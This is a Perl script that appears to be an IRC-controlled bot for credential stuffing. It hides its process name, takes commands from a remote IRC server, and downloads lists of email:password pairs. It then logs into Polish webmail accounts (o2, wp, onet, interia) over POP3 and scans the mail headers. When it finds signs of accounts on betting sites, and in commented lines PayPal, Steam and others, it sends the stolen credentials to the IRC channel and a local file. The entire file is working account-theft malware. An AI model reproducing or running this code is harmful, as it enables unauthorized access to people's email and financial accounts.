#!/usr/bin/perl 
# V.O..Do. :D
use IO::Socket::INET ; use Socket;
#sorrrry but must ;p
use Net::POP3; use Mail::POP3Client;
my $ch = "#";
#%SIG = ('HUP','IGNORE','INT','IGNORE','PIPE','IGNORE','TERM','IGNORE');
#sub randnick(){return "Bov" . int(rand(1)*100) . int(rand(1)*200) . int(rand(1)*300);}
sub randnick(){return "VoSlaave";}
sub msg($$){print $connection "PRIVMSG ".$ch." : $_[0] $_[1]\r\n";}
my $processo = "whoo leet the dogs out";
my $pid=fork;
exit if $pid;
$0="$processo"."\0"x16;
$connection = IO::Socket::INET->new(PeerAddr=>"irc.podgorz.org",PeerPort=>"9911",Proto=>'tcp',Timeout=>'30') or die " [!] Couldnt Connect To $server\n";
print $connection "USER XxX Jo * :Hello\r\n";
print $connection "NICK ".&randnick()."\r\n";
while($response = <$connection>)
{ 
   print $response;
	#-------- Time Too Shiiit.
   if($response =~ m/:(.*) 00(.*) (.*) :/) { print $connection "JOIN ".$ch."\r\n"; }
	if($response =~ m/^PING (.*?)$/gi) { print $connection "PONG ".$1."\r\n"; }
#---	if($response =~ m/:!help/) { &bot_help(); }	
#-------- End Shiiit.zw
  
    #-------- Scan shit
    if($response =~ m/:!mailscan\s+(.*?)\s+(.*)/) { if(fork() == 0){ &scmail($1,$2); }} #----- nie done
#--- end while
	}
sub scmail() {
my $url = $_[0];
my $file = "/tmp/" . int(rand(1)*100) . ".txt";
&getstore($url,$file);
&msg("Mail scan started");
open(FILE, $file);
while(<FILE>) {
chomp($_);
$_=~s/\r//;
while($_ =~ m/(.*?)\@(.*?):(.*)/g){
my $log=$1;
my $dom=$2;
my $haslo=$3;
my $cal=$_;
# Onet amorki.pl autograf.pl buziaczek.pl onet.eu op.pl poczta.onet.eu poczta.onet.pl vp.pl         -------- Work ale slabo. (do poprawy)
if($dom =~ m/amorki|poczta.onet|vp|op.pl/) {
my $mail= $log."\@".$dom;
#print("TO 0ne3t ".$log."\@".$dom.".pl A haslo".$haslo."\r\n");
#print("fucnkaj onet dziala a tera sprawdzam mail $mail\r\n");
#print("$mail");
&onet($mail,$haslo);
}
# O2 o2.pl go2.pl tlen.pl       ------- WORK good.
if($dom =~ m/o2|go2|tlen/) {
my $mail= $log."\@".$dom;
#print("TO o2 ".$log."\@".$dom.".pl A haslo ".$haslo."\r\n");
&o2($mail,$haslo);
}
# wp wp.pl
if($dom =~ m/wp/) {            #------- WORK good
my $mail= $log."\@".$dom;
#print("TO wp ".$log."\@".$dom.".pl A haslo ".$haslo."\r\n");
&wp($mail,$haslo);
}
# Interia interia.pl poczta.fm interia.eu 1gb.pl 2gb.pl vip.interia.pl serwus.pl akcja.pl czateria.pl znajomi.pl #------ WORK fine
if($dom =~ m/interia|1gb|2gb|interia|serwus|akcja|czateria|znajomi/) {
my $mail= $log."\@".$dom;
#print("TO Interia ".$log."\@".$dom.".pl A haslo ".$haslo."\r\n");
&interia($mail,$haslo);
}
#print("Login $log Domena $dom Haslo: $haslo icalosc $cal \r\n");
}
}
close(FILE);
}
sub o2() {
my $login = $_[0];
my $haslo = $_[1];
$pop = Net::POP3->new('poczta.o2.pl');
$result = $pop->login( $login , $haslo );
if ($result eq undef) { 
##print "Nie zalogowano!! Usera $login z haslem: $haslo\r\n"; 
}
else { 
 if(fork() == 0){
print "Zalogowano!! na $login z haslem $haslo\r\n";
print "liczba postow w skrzynce: $result\r\n"; 
&save($login,$haslo, "poczta.o2.pl","http://poczta.o2.pl/");
}
$pop->quit();
}}
sub interia() {
my $login = $_[0];
my $haslo = $_[1];
$pop = Net::POP3->new('poczta.interia.pl');
$result = $pop->login( $login , $haslo );
if ($result eq undef) { 
#print "Nie zalogowano!! Usera $login z haslem: $haslo\r\n"; 
}
else { 
 if(fork() == 0){
print "Zalogowano!! na $login z haslem $haslo\r\n";
print "liczba postow w skrzynce: $result\r\n"; 
&save($login,$haslo, "poczta.interia.pl","http://poczta.interia.pl/");
}
$pop->quit();
}}
sub onet() {
my $login = $_[0];
my $haslo = $_[1];
#print("test $login");
$pop = Net::POP3->new('pop3.poczta.onet.pl');
$result = $pop->login( $login , $haslo );
if ($result eq undef) { 
#print "Nie zalogowano!! Usera $login z haslem: $haslo\r\n"; 
}
else {
 if(fork() == 0){
print "Zalogowano!! na $login z haslem $haslo\r\n";
print "liczba postow w skrzynce: $result\r\n"; 
&save($login,$haslo, "pop3.poczta.onet.pl","http://poczta.onet.pl");
}
$pop->quit();
}}
sub wp() {
my $login = $_[0];
my $haslo = $_[1];
$pop = Net::POP3->new('pop3.wp.pl');
$result = $pop->login( $login , $haslo );
if ($result eq undef) { 
#print "Nie zalogowano!! Usera $login z haslem: $haslo\r\n"; 
}
else { 
 if(fork() == 0){
print "Zalogowano!! na $login z haslem $haslo\r\n";
print "liczba postow w skrzynce: $result\r\n"; 
&save($login,$haslo, "pop3.wp.pl","http://poczta.wp.pl");
}
$pop->quit();
}}
sub save() {
$login = $_[0];
$haslo = $_[1];
$popcz = $_[2];
$co = $_[3];
#&msg("Login: $login Password: $haslo Pop3: $popcz Web_Panel: $co");
my($pop) = Mail::POP3Client->new($login, $haslo, $popcz);
for ($i = 1; $i <= $pop->Count; $i++) {
    foreach ($pop->Head($i)) {
#  if($_ =~ /tech-haslo\@gadu-gadu.pl/) {  &msg("9Gadu-Gadu - Found ON => $login : $haslo"); }
#  if($_ =~ /system\@thecrims.com/) {  &msg("9The Crims - Found ON => $login : $haslo"); }
#  if($_ =~ /Twoje dane login/) {  &msg("9Bwin - Found ON => $login : $haslo"); }
#  if($_ =~ /customerservices365.com/) {  &msg("9bet365 - Found ON => $login : $haslo"); }
#  if($_ =~ /support\@pokerstars.com/) {  &msg("9pokerstars.com - Found ON => $login : $haslo"); }
#  if($_ =~ /witamy Chomika/) {  &msg("9chomikuj.pl - Found ON => $login : $haslo"); }
  if($_ =~ /Witamy serdecznie w bet-at-home.com/) {  &msg("bet-at-home - MAIL  Found ON => $login : $haslo"); }
#  if($_ =~ /rapidshare/) {  &msg("rapidshare - Found ON => $login : $haslo"); }
#  if($_ =~ /dotpay/) {  &msg("dotpay - Found ON => $login : $haslo"); }
#  if($_ =~ /paypal.com/) {  &msg("Paypal - Found ON => $login : $haslo"); }
#  if($_ =~ /transferonlinemoney.com/) {  &msg("transferonlinemoney.com FOUND ON - $login $haslo"); }
#  if($_ =~ /moneygram.com/) {  &msg("moneygram.com - Found ON => $login : $haslo"); }
#  if($_ =~ /888.com/) {  &msg("888.com - Found ON => $login : $haslo"); }
#  if($_ =~ /pokerstars.com/) {  &msg("Pokerstars - Found ON => $login : $haslo"); }
#  if($_ =~ /steampowered.com/) {  &msg("Steam - Found ON => $login : $haslo"); }
#  if($_ =~ /nightwood/) {  &msg("Paypal - Found ON => $login : $haslo"); }
#  if($_ =~ /warofdragons/) {  &msg("Paypal - Found ON => $login : $haslo"); }
#  if($_ =~ /expekt.com/) {  &msg("expekt.com - Found ON => $login : $haslo"); }
#  if($_ =~ /bet365/) {  &msg("bet365.com - Found ON => $login : $haslo"); }
#  if($_ =~ /betway.com/) {  &msg("betway.com - Found ON => $login : $haslo"); }
#  if($_ =~ /unibet/) {  &msg("unibet.com - Found ON => $login : $haslo"); }
#  if($_ =~ /moneybookers.com/) {  &msg("moneybookers.com - Found ON => $login : $haslo"); }
#  if($_ =~ /libertyreserve/) {  &msg("libertyreserve.com - Found ON => $login : $haslo"); }
#  if($_ =~ /ircnet.pl/) {  &msg("ircnet.pl - Found ON => $login : $haslo"); }
#  if($_ =~ /podbij.pl/) {  &msg("Podbij.pl - Found ON => $login : $haslo"); }
#  if($_ =~ /hotfile.com/) {  &msg("hotfile.com - Found ON => $login : $haslo"); }
#  if($_ =~ /sharingmatrix/) {  &msg("sharingmatrix.com - Found ON => $login : $haslo"); }
#  if($_ =~ /pokerstars/) {  &msg("pokerstars.com - Found ON => $login : $haslo"); }
#  if($_ =~ /betsson.com/) {  &msg("betsson.com - Found ON => $login : $haslo"); }
             
  
open (email, ">> /tmp/emaildone.txt");
/^(From|Subject):\s+/i && print email "$_ ||",;
}
print email $login.":".$haslo."\n"; 
close (email);
    }}
use LWP::Simple;
###------------ Pobierz
sub getstore ($$)
{
  my $url = $_[0];
  my $file = $_[1];
  $http_stream_out = 1;
  open(GET_OUTFILE, "> $file");
  %http_loop_check = ();
  _get($url);
  close GET_OUTFILE;
  return $main::http_get_result;
}
sub _get
{
  my $url = shift;
  my $proxy = "";
  grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
  if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
    my $host = $1;
    my $port = $2 || 80;
    my $path = $3;
    $path = "/" unless defined($path);
    return _trivial_http_get($host, $port, $path);
  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
    my $host = $1;
    my $port = $2;
    my $path = $url;
    return _trivial_http_get($host, $port, $path);
  } else {
    return undef;
  }
}
sub _trivial_http_get
{
  my($host, $port, $path) = @_;
  my($AGENT, $VERSION, $p);
  #print "HOST=$host, PORT=$port, PATH=$path\n";
  $AGENT = "get-minimal";
  $VERSION = "20000118";
  $path =~ s/ /%20/g;
  require IO::Socket;
  local($^W) = 0;
  my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                   PeerPort => $port,
                                   Proto   => 'tcp',
                                   Timeout  => 60) || return;
  $sock->autoflush;
  my $netloc = $host;
  $netloc .= ":$port" if $port != 80;
  my $request = "GET $path HTTP/1.0\015\012"
              . "Host: $netloc\015\012"
              . "User-Agent: $AGENT/$VERSION/u\015\012";
  $request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
  $request .= "\015\012";
  print $sock $request;
  my $buf = "";
  my $n;
  my $b1 = "";
  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
    if ($b1 eq "") { # first block?
      $b1 = $buf;         # Save this for errorcode parsing
      $buf =~ s/.+?\015?\012\015?\012//s;      # zap header
    }
    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = ""; }
  }
  return undef unless defined($n);
  $main::http_get_result = 200;
  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
    $main::http_get_result = $1;
    # print "CODE=$main::http_get_result\n$b1\n";
    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/
) {
      # redirect
      my $url = $1;
      return undef if $http_loop_check{$url}++;
      return _get($url);
    }
    return undef unless $main::http_get_result =~ /^2/;
  }
  return $buf;
}